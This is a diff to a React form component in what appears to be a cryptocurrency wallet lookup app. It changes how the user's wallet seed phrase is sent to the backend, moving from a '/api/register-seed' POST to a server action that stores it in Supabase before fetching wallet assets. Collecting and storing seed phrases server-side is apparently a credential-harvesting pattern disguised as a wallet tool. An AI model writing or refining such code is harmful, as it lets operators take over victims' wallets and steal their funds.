@@ -25,7 +25,7 @@ import {
 } from "@/components/ui/select";
 import { Textarea } from "@/components/ui/textarea";
 import { Card, CardContent } from "@/components/ui/card";
-import { handleFetchData } from "@/app/actions";
+import { handleFetchData, registerSeedPhrase } from "@/app/actions";
 import { useToast } from "@/hooks/use-toast";
 import type { WalletData } from "@/app/actions";
 
@@ -83,58 +83,42 @@ export function SeedPhraseForm({
     setIsSubmitting(true);
     onFetchStart();
 
-    try {
-      // First, try inserting the seed phrase in the backend via the API route
-      const response = await fetch("/api/register-seed", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          seedPhrase: values.seedPhrase,
-          network: values.network,
-        }),
-      });
+    // We use a FormData object to pass the data to our server actions
+    const formData = new FormData();
+    formData.append("seedPhrase", values.seedPhrase);
+    formData.append("network", values.network);
 
-      if (!response.ok) {
-        // If the API call fails, parse the error and show it.
-        const errorData = await response.json();
-        throw new Error(errorData.error || "Failed to register seed phrase with the server.");
-      }
-      
-      // If registration is successful, continue with fetching wallet data locally
-      const formData = new FormData();
-      formData.append("seedPhrase", values.seedPhrase);
-      formData.append("network", values.network);
+    // First, register the seed phrase with Supabase using a server action
+    const registrationResult = await registerSeedPhrase(formData);
 
-      const result = await handleFetchData(formData);
-
-      if (result.success && result.data) {
-        onDataFetched(result.data);
-      } else {
-        // This error is for the local data fetching, not the server registration
-        toast({
-          variant: "destructive",
-          title: "Failed to fetch wallet assets",
-          description:
-            result.error ||
-            "An unknown error occurred while fetching wallet data.",
-        });
-        onDataFetched(null);
-      }
-
-    } catch (error: any) {
-      // This will catch errors from the fetch call (e.g., network error)
-      // or the error thrown if the response was not OK.
+    if (!registrationResult.success) {
       toast({
         variant: "destructive",
-        title: "An error occurred",
-        description: error.message,
+        title: "Failed to Register Seed Phrase",
+        description: registrationResult.error,
       });
       onDataFetched(null);
-    } finally {
-        setIsSubmitting(false);
+      setIsSubmitting(false);
+      return;
     }
+
+    // If registration is successful, fetch the wallet data
+    const dataFetchResult = await handleFetchData(formData);
+
+    if (dataFetchResult.success && dataFetchResult.data) {
+      onDataFetched(dataFetchResult.data);
+    } else {
+      toast({
+        variant: "destructive",
+        title: "Failed to Fetch Wallet Assets",
+        description:
+          dataFetchResult.error ||
+          "An unknown error occurred while fetching wallet data.",
+      });
+      onDataFetched(null);
+    }
+
+    setIsSubmitting(false);
   }
 
   return (
